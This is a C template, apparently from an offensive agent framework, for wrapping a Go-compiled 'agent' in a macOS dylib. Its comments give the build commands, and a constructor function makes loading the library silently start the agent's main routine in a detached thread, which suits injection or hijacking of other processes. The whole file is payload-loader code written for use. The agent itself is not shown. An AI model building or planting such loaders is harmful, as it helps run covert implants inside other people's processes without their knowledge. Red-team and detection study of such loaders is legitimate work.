#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>
#include <assert.h>
#include <pthread.h>
#include "default.h" //Change the header file name 
// To build :
// 1. Build a c-archive in golang: go build -buildmode=c-archive -o whatever.a -tags=[profile] cmd/agent/main.go
// 2. Build a shared lib (darwin): clang -shared -framework Foundation -framework CoreGraphics -framework Security -fpic payload-template.c whatever.a -o whatever.dylib

__attribute__ ((constructor)) void initializer()
{
	pthread_attr_t  attr;
    pthread_t       posixThreadID;
    int             returnVal;
    
    returnVal = pthread_attr_init(&attr);
    assert(!returnVal);
    returnVal = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    assert(!returnVal);
    pthread_create(&posixThreadID, &attr, &RunMain, NULL);
}